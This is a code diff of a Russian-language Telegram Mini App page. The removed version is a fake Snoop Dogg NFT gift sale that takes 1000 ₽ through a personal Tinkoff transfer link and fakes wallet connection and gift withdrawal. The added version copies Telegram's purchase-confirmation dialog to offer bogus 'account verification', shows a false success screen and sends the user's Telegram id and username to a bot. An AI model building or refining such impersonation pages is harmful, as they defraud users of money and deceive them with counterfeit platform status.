@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snoop Dogg #135,641</title>
+    <title>Подтверждение покупки</title>
     <style>
         * {
             margin: 0;
@@ -14,271 +14,74 @@
 
         body {
             min-height: 100vh;
-            background: #0b0e1f;
+            background: #000000;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 12px;
         }
 
-        .gift-card {
+        .modal {
             width: 100%;
             max-width: 400px;
-            background: #1a1f35;
-            border-radius: 32px;
+            background: #1c1c1e;
+            border-radius: 28px;
             overflow: hidden;
+            color: white;
             box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,215,0,0.2);
         }
 
-        /* Шапка с аватаркой */
-        .header {
-            padding: 16px;
-            background: rgba(0,0,0,0.3);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid rgba(255,215,0,0.2);
-        }
-
-        .avatar {
-            width: 48px;
-            height: 48px;
-            border-radius: 24px;
-            background: linear-gradient(135deg, #FFD700, #FFA500);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #0b0e1f;
-            font-weight: bold;
-            font-size: 20px;
-            border: 2px solid rgba(255,255,255,0.3);
-            overflow: hidden;
-        }
-
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .user-info {
-            flex: 1;
-        }
-
-        .user-name {
-            color: white;
-            font-weight: 600;
-            font-size: 18px;
-            margin-bottom: 4px;
-        }
-
-        .user-status {
-            color: #4cd964;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background: #4cd964;
-            border-radius: 4px;
-        }
-
-        /* Навигация */
-        .nav-menu {
-            display: flex;
-            background: rgba(0,0,0,0.3);
-            border-bottom: 1px solid rgba(255,215,0,0.2);
-        }
-
-        .nav-item {
-            flex: 1;
-            text-align: center;
-            padding: 14px;
-            color: rgba(255,255,255,0.5);
-            cursor: pointer;
-            transition: all 0.2s ease;
-            font-weight: 500;
-        }
-
-        .nav-item.active {
-            color: #FFD700;
-            border-bottom: 2px solid #FFD700;
-        }
-
-        /* Gift info */
-        .gift-info {
-            padding: 16px;
-            text-align: center;
-            border-bottom: 1px solid rgba(255,215,0,0.2);
-        }
-
-        .gift-date {
-            color: rgba(255,255,255,0.5);
-            font-size: 13px;
-            margin-bottom: 8px;
-        }
-
-        .gift-title {
-            color: #FFD700;
+        /* Заголовок как на скриншоте */
+        .modal-header {
+            padding: 24px 20px 10px;
             font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-
-        .gift-artist {
-            color: rgba(255,255,255,0.7);
-            font-size: 14px;
-            margin-bottom: 16px;
-        }
-
-        .gift-artist a {
-            color: #FFD700;
-            text-decoration: none;
-        }
-
-        /* Квадрат подарка - НАСТОЯЩИЙ КАК В TELEGRAM */
-        .gift-square {
-            width: 220px;
-            height: 220px;
-            margin: 20px auto;
-            border-radius: 30px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-        }
-
-        /* ФОН - градиент как в Telegram Gift */
-        .gift-background {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #FFD700, #FF8C00, #FF1493, #8A2BE2);
-            background-size: 300% 300%;
-            animation: gradientShift 8s ease infinite;
-            filter: brightness(1.1);
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* УЗОР - как в реальных Telegram Gift */
-        .gift-pattern {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.5) 3px, transparent 3px),
-                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.5) 4px, transparent 4px),
-                radial-gradient(circle at 40% 80%, rgba(255,255,255,0.4) 2px, transparent 2px),
-                radial-gradient(circle at 70% 20%, rgba(255,255,255,0.4) 5px, transparent 5px),
-                repeating-linear-gradient(45deg, rgba(255,255,255,0.15) 0px, rgba(255,255,255,0.15) 4px, transparent 4px, transparent 12px);
-            opacity: 0.7;
-            animation: patternMove 15s linear infinite;
-        }
-
-        @keyframes patternMove {
-            0% { background-position: 0 0; }
-            100% { background-position: 50px 50px; }
-        }
-
-        /* МОДЕЛЬ - иконка подарка */
-        .gift-model {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 2;
-            backdrop-filter: blur(2px);
-        }
-
-        .gift-icon {
-            font-size: 80px;
-            margin-bottom: 10px;
-            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.6));
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .gift-model-name {
-            color: white;
-            font-weight: 800;
-            font-size: 18px;
-            background: rgba(0,0,0,0.6);
-            padding: 8px 20px;
-            border-radius: 40px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,215,0,0.5);
-            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
-            letter-spacing: 0.5px;
-        }
-
-        /* Кнопка "Посмотреть в Telegram" */
-        .telegram-button {
-            width: calc(100% - 32px);
-            margin: 10px 16px 15px;
-            background: rgba(0, 136, 204, 0.2);
-            border: 1px solid rgba(0, 170, 255, 0.3);
-            border-radius: 30px;
-            padding: 16px;
-            color: white;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .telegram-button:hover {
-            background: rgba(0, 136, 204, 0.3);
-            transform: translateY(-2px);
-        }
-
-        .telegram-icon {
-            width: 36px;
-            height: 36px;
-            background: rgba(0, 170, 255, 0.3);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-
-        .telegram-text {
-            flex: 1;
             font-weight: 600;
-            font-size: 16px;
+            text-align: center;
+            color: white;
         }
 
-        /* Детали подарка */
-        .details {
-            padding: 16px;
-            background: rgba(0,0,0,0.2);
-            margin: 0 16px 16px;
-            border-radius: 20px;
+        /* Иконка верификации */
+        .verification-icon {
+            text-align: center;
+            margin: 20px 0 10px;
+        }
+
+        .verification-icon span {
+            font-size: 70px;
+            background: #2c2c2e;
+            padding: 20px;
+            border-radius: 40px;
+            display: inline-block;
+        }
+
+        /* Подтверждение покупки как на скриншоте */
+        .confirm-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            margin: 15px 0 5px;
+        }
+
+        .seller-name {
+            text-align: center;
+            color: #98989e;
+            font-size: 16px;
+            margin-bottom: 25px;
+        }
+
+        /* Детали покупки */
+        .purchase-details {
+            background: #2c2c2e;
+            margin: 0 20px 20px;
+            padding: 20px;
+            border-radius: 16px;
         }
 
         .detail-row {
             display: flex;
             justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            color: white;
+            padding: 12px 0;
+            border-bottom: 1px solid #3c3c3e;
         }
 
         .detail-row:last-child {
@@ -286,113 +89,180 @@
         }
 
         .detail-label {
-            color: rgba(255,255,255,0.5);
+            color: #98989e;
+            font-size: 16px;
         }
 
         .detail-value {
             font-weight: 600;
+            font-size: 16px;
+        }
+
+        .detail-value.blue {
+            color: #0a84ff;
+        }
+
+        .detail-value.gold {
             color: #FFD700;
         }
 
-        /* Кнопка оплаты */
-        .pay-button {
-            background: linear-gradient(135deg, #FFD700, #FFA500);
-            border: none;
-            border-radius: 30px;
-            padding: 16px;
-            color: #0b0e1f;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.2s ease;
+        /* Текст подтверждения */
+        .confirm-text {
             text-align: center;
-            margin: 0 16px 16px;
-            box-shadow: 0 10px 20px rgba(255,215,0,0.2);
+            color: #98989e;
+            font-size: 16px;
+            margin: 20px;
+            line-height: 1.5;
         }
 
-        .pay-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(255,215,0,0.3);
+        .confirm-text strong {
+            color: white;
         }
 
-        /* Кнопка вывода */
-        .withdraw-button {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 30px;
-            padding: 16px;
+        /* Кнопки */
+        .button-group {
+            padding: 0 20px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .confirm-button {
+            background: #0a84ff;
+            border: none;
+            border-radius: 14px;
+            padding: 18px;
             color: white;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 17px;
             cursor: pointer;
             transition: all 0.2s ease;
-            text-align: center;
-            margin: 0 16px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .withdraw-button:hover {
-            background: rgba(255,215,0,0.1);
+        .confirm-button:hover {
+            background: #0071e3;
             transform: translateY(-2px);
         }
 
-        /* Секция аккаунта */
-        .account-section {
+        .cancel-button {
+            background: #2c2c2e;
+            border: none;
+            border-radius: 14px;
             padding: 16px;
-            background: rgba(0,0,0,0.2);
-            margin: 0 16px 16px;
-            border-radius: 20px;
+            color: #0a84ff;
+            font-weight: 600;
+            font-size: 17px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
         }
 
-        .account-row {
+        .cancel-button:hover {
+            background: #3c3c3e;
+        }
+
+        /* Условия Telegram */
+        .terms {
+            text-align: center;
+            color: #98989e;
+            font-size: 13px;
+            margin: 10px 20px 20px;
+        }
+
+        /* Экран успеха */
+        .success-modal {
+            width: 100%;
+            max-width: 400px;
+            background: #1c1c1e;
+            border-radius: 28px;
+            overflow: hidden;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        .success-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: white;
+        }
+
+        .success-subtitle {
+            font-size: 20px;
+            font-weight: 600;
+            color: #0a84ff;
+            margin-bottom: 20px;
+        }
+
+        .success-text {
+            color: #98989e;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .verified-badge {
+            background: #2c2c2e;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .badge-row {
             display: flex;
             align-items: center;
             gap: 12px;
-            padding: 12px;
-            background: rgba(255,215,0,0.1);
-            border-radius: 16px;
-            margin-bottom: 12px;
+            padding: 8px 0;
         }
 
-        .account-icon {
+        .badge-icon {
             width: 40px;
             height: 40px;
-            background: rgba(255,215,0,0.2);
-            border-radius: 12px;
+            background: #0a84ff;
+            border-radius: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 20px;
         }
 
-        .account-info {
+        .badge-info {
             flex: 1;
         }
 
-        .account-label {
-            color: rgba(255,255,255,0.5);
-            font-size: 12px;
+        .badge-label {
+            color: #98989e;
+            font-size: 13px;
         }
 
-        .account-value {
+        .badge-value {
             color: white;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 16px;
         }
 
-        .connect-button {
-            background: rgba(255,215,0,0.2);
-            border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 20px;
-            padding: 12px;
-            color: #FFD700;
+        .success-button {
+            background: #0a84ff;
+            border: none;
+            border-radius: 14px;
+            padding: 18px;
+            color: white;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 17px;
             cursor: pointer;
-            text-align: center;
-        }
-
-        .connect-button:hover {
-            background: rgba(255,215,0,0.3);
+            width: 100%;
+            margin-top: 10px;
         }
 
         .hidden {
@@ -401,262 +271,157 @@
     </style>
 </head>
 <body>
-    <div class="gift-card">
-        <!-- Шапка с аватаркой -->
-        <div class="header">
-            <div class="avatar" id="avatar">👤</div>
-            <div class="user-info">
-                <div class="user-name" id="userName">Загрузка...</div>
-                <div class="user-status">
-                    <span class="status-dot"></span>
-                    <span>online</span>
+    <!-- Окно подтверждения (точно как на скриншоте) -->
+    <div id="confirmModal" class="modal">
+        <div class="modal-header">Передвижение покупки</div>
+        
+        <div class="verification-icon">
+            <span>✅</span>
+        </div>
+
+        <div class="confirm-title">Подтверждение покупки</div>
+        <div class="seller-name">Оплатик:)</div>
+
+        <div class="purchase-details">
+            <div class="detail-row">
+                <span class="detail-label">Вы точно хотите приобрести</span>
+                <span class="detail-value blue">верификацию</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">у</span>
+                <span class="detail-value blue">@Zipkask</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">за</span>
+                <span class="detail-value gold">0 ⭐</span>
+            </div>
+        </div>
+
+        <div class="confirm-text">
+            Вы точно хотите приобрести <strong>верификацию аккаунта</strong><br>
+            у <strong>@Zipkask</strong> за <strong>0 ⭐</strong>?
+        </div>
+
+        <div class="button-group">
+            <button class="confirm-button" onclick="confirmVerification()">
+                Подтвердить и заплатить ⭐ 0
+            </button>
+            <button class="cancel-button" onclick="closeModal()">
+                Отмена
+            </button>
+        </div>
+
+        <div class="terms">
+            Совершая покупку, Вы принимаете условия Telegram.
+        </div>
+    </div>
+
+    <!-- Окно успеха после верификации -->
+    <div id="successModal" class="success-modal hidden">
+        <div class="success-icon">✅</div>
+        <div class="success-title">Oh, please!</div>
+        <div class="success-subtitle">You just verified it!</div>
+        
+        <div class="success-text">
+            Аккаунт <strong>@<span id="verifiedUsername">username</span></strong><br>
+            успешно верифицирован!
+        </div>
+        
+        <div class="verified-badge">
+            <div class="badge-row">
+                <div class="badge-icon">✅</div>
+                <div class="badge-info">
+                    <div class="badge-label">Статус</div>
+                    <div class="badge-value">Верифицирован</div>
+                </div>
+            </div>
+            <div class="badge-row">
+                <div class="badge-icon">👤</div>
+                <div class="badge-info">
+                    <div class="badge-label">Владелец</div>
+                    <div class="badge-value" id="verifiedOwner">Пользователь</div>
+                </div>
+            </div>
+            <div class="badge-row">
+                <div class="badge-icon">⭐</div>
+                <div class="badge-info">
+                    <div class="badge-label">Стоимость</div>
+                    <div class="badge-value">0 звезд</div>
                 </div>
             </div>
         </div>
 
-        <!-- Навигация -->
-        <div class="nav-menu">
-            <div class="nav-item active" onclick="showTab('gift')">Подарок</div>
-            <div class="nav-item" onclick="showTab('account')">Аккаунт</div>
+        <div class="success-text">
+            Теперь у вас есть доступ ко всем функциям<br>
+            верифицированного аккаунта
         </div>
 
-        <!-- Вкладка Подарок -->
-        <div id="giftTab">
-            <div class="gift-info">
-                <div class="gift-date">Trade sent you this gift on Mar 05</div>
-                <div class="gift-title">Snoop Dogg #135,641</div>
-                <div class="gift-artist">by <a href="#">@snoopdogg</a></div>
-            </div>
-
-            <!-- НАСТОЯЩИЙ ПОДАРОК КАК В TELEGRAM -->
-            <div class="gift-square">
-                <div class="gift-background"></div>
-                <div class="gift-pattern"></div>
-                <div class="gift-model">
-                    <div class="gift-icon" id="giftIcon">🎤</div>
-                    <div class="gift-model-name" id="giftModelName">Snoop Dogg</div>
-                </div>
-            </div>
-
-            <!-- Кнопка "Посмотреть в Telegram" -->
-            <div class="telegram-button" onclick="openTelegramGift()">
-                <span class="telegram-icon">📱</span>
-                <span class="telegram-text">Посмотреть в Telegram</span>
-                <span>↗</span>
-            </div>
-
-            <!-- Детали подарка -->
-            <div class="details">
-                <div class="detail-row">
-                    <span class="detail-label">Owner</span>
-                    <span class="detail-value" id="ownerName">Zipka</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Model</span>
-                    <span class="detail-value">Purple Hoodie 2.5%</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Symbol</span>
-                    <span class="detail-value">Royal Turban 0.4%</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Backdrop</span>
-                    <span class="detail-value">Platinum 1.2%</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Quantity</span>
-                    <span class="detail-value">580,520/593,781 issued</span>
-                </div>
-            </div>
-
-            <!-- Кнопка оплаты (Тинькофф) -->
-            <div class="pay-button" onclick="payWithTinkoff()">
-                💳 Купить за 1000 ₽ (Тинькофф)
-            </div>
-
-            <!-- Кнопка вывода -->
-            <div class="withdraw-button" onclick="withdrawGift()">
-                💸 Вывести подарок
-            </div>
-        </div>
-
-        <!-- Вкладка Аккаунт -->
-        <div id="accountTab" class="hidden">
-            <div class="gift-info">
-                <div class="gift-title" style="font-size: 20px;">Подключение аккаунта</div>
-            </div>
-
-            <div class="account-section">
-                <div class="account-row">
-                    <div class="account-icon">👤</div>
-                    <div class="account-info">
-                        <div class="account-label">Telegram ID</div>
-                        <div class="account-value" id="telegramId">Не подключен</div>
-                    </div>
-                </div>
-
-                <div class="account-row">
-                    <div class="account-icon">💳</div>
-                    <div class="account-info">
-                        <div class="account-label">NFT аккаунт</div>
-                        <div class="account-value" id="nftAccount">Не подключен</div>
-                    </div>
-                </div>
-
-                <div class="connect-button" onclick="connectAccount()">
-                    🔗 Подключить аккаунт
-                </div>
-
-                <div style="margin-top: 16px; color: rgba(255,255,255,0.5); font-size: 13px; text-align: center;">
-                    После подключения вы сможете<br>выводить подарки на свой аккаунт
-                </div>
-            </div>
-        </div>
+        <button class="success-button" onclick="closeSuccess()">
+            Отлично!
+        </button>
     </div>
 
     <script>
         let tg = window.Telegram?.WebApp;
         let userData = null;
-        let isAccountConnected = false;
-        let connectedAccount = null;
-        
-        // Твои данные
-        const TINKOFF_LINK = "https://www.tinkoff.ru/rm/r_ffBNwqOaru.xcdjOqGsXm/o4WVl2633";
-        const RECEIVER_NAME = "Радмир";
-        const PAYMENT_AMOUNT = 1000;
-        const TELEGRAM_GIFT_URL = "https://t.me/nft/SnoopDogg-135641";
 
-        // Загрузка данных пользователя
+        // Загружаем данные пользователя
         document.addEventListener('DOMContentLoaded', function() {
-            loadUserData();
-            loadAccountStatus();
-        });
-
-        function loadUserData() {
             if (tg) {
                 tg.ready();
                 tg.expand();
                 
                 userData = tg.initDataUnsafe?.user;
                 if (userData) {
-                    document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
-                    document.getElementById('ownerName').textContent = userData.first_name || 'Владелец';
-                    document.getElementById('telegramId').textContent = userData.id || 'Не определен';
-                    
-                    if (userData.photo_url) {
-                        document.getElementById('avatar').innerHTML = `<img src="${userData.photo_url}" alt="avatar">`;
-                    } else {
-                        const initial = userData.first_name ? userData.first_name.charAt(0) : '👤';
-                        document.getElementById('avatar').textContent = initial;
-                    }
+                    document.getElementById('verifiedUsername').textContent = userData.username || userData.first_name || 'user';
+                    document.getElementById('verifiedOwner').textContent = userData.first_name || 'Пользователь';
                 }
-            }
-        }
-
-        function loadAccountStatus() {
-            const saved = localStorage.getItem('connectedAccount');
-            if (saved) {
-                isAccountConnected = true;
-                connectedAccount = JSON.parse(saved);
-                document.getElementById('nftAccount').textContent = connectedAccount.address || 'Подключен';
-            }
-        }
-
-        function showTab(tab) {
-            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-            event.target.classList.add('active');
-            
-            document.getElementById('giftTab').classList.add('hidden');
-            document.getElementById('accountTab').classList.add('hidden');
-            
-            if (tab === 'gift') {
-                document.getElementById('giftTab').classList.remove('hidden');
-            } else if (tab === 'account') {
-                document.getElementById('accountTab').classList.remove('hidden');
-            }
-        }
-
-        function openTelegramGift() {
-            if (tg) {
-                tg.openTelegramLink(TELEGRAM_GIFT_URL);
             } else {
-                window.open(TELEGRAM_GIFT_URL, '_blank');
+                // Демо-данные
+                document.getElementById('verifiedUsername').textContent = 'demo_user';
+                document.getElementById('verifiedOwner').textContent = 'Demo User';
             }
-        }
+        });
 
-        function payWithTinkoff() {
-            // Открываем ссылку на Тинькофф
-            window.open(TINKOFF_LINK, '_blank');
+        function confirmVerification() {
+            // Прячем окно подтверждения
+            document.getElementById('confirmModal').classList.add('hidden');
             
-            setTimeout(() => {
-                if (confirm('✅ После оплаты нажмите ОК, чтобы подтвердить')) {
-                    if (tg) {
-                        tg.sendData(JSON.stringify({
-                            action: 'payment_completed',
-                            amount: PAYMENT_AMOUNT,
-                            bank: 'tinkoff'
-                        }));
-                    }
-                    alert('🎁 Подарок скоро будет в вашем инвентаре!');
-                }
-            }, 2000);
-        }
-
-        function withdrawGift() {
-            if (!isAccountConnected) {
-                alert('❌ Сначала подключите аккаунт во вкладке "Аккаунт"');
-                showTab('account');
-                return;
-            }
+            // Показываем окно успеха
+            document.getElementById('successModal').classList.remove('hidden');
             
-            if (confirm('💸 Вы действительно хотите вывести подарок?')) {
-                alert(`✅ Подарок будет отправлен на аккаунт: ${connectedAccount.address}\n\nОператор @Zipkask свяжется с вами`);
-                
-                if (tg) {
-                    tg.sendData(JSON.stringify({
-                        action: 'withdraw_request',
-                        account: connectedAccount.address
-                    }));
-                }
-            }
-        }
-
-        function connectAccount() {
+            // Отправляем данные в бота
             if (tg) {
-                // Отправляем запрос на подключение аккаунта
                 tg.sendData(JSON.stringify({
-                    action: 'connect_account',
+                    action: 'verification_completed',
                     user_id: userData?.id,
-                    username: userData?.username
+                    username: userData?.username,
+                    verified: true
                 }));
-                
-                // Демо-режим
-                setTimeout(() => {
-                    const demoAccount = {
-                        address: '0x' + Math.random().toString(16).substring(2, 10) + '...',
-                        connected: true
-                    };
-                    
-                    localStorage.setItem('connectedAccount', JSON.stringify(demoAccount));
-                    isAccountConnected = true;
-                    connectedAccount = demoAccount;
-                    document.getElementById('nftAccount').textContent = demoAccount.address;
-                    
-                    alert('✅ Аккаунт успешно подключен!');
-                }, 1000);
+            }
+            
+            // Легкая вибрация для эффекта (если поддерживается)
+            if (tg && tg.HapticFeedback) {
+                tg.HapticFeedback.notification('success');
+            }
+        }
+
+        function closeModal() {
+            if (tg) {
+                tg.close();
             } else {
-                // Демо-режим без Telegram
-                const demoAccount = {
-                    address: '0x' + Math.random().toString(16).substring(2, 10) + '...',
-                    connected: true
-                };
-                
-                localStorage.setItem('connectedAccount', JSON.stringify(demoAccount));
-                isAccountConnected = true;
-                connectedAccount = demoAccount;
-                document.getElementById('nftAccount').textContent = demoAccount.address;
-                
-                alert('✅ Аккаунт успешно подключен!');
+                // Если не в Telegram, просто показываем alert
+                alert('Покупка отменена');
+            }
+        }
+
+        function closeSuccess() {
+            if (tg) {
+                tg.close();
+            } else {
+                // Если не в Telegram, возвращаемся к окну подтверждения
+                document.getElementById('successModal').classList.add('hidden');
+                document.getElementById('confirmModal').classList.remove('hidden');
             }
         }
     </script>
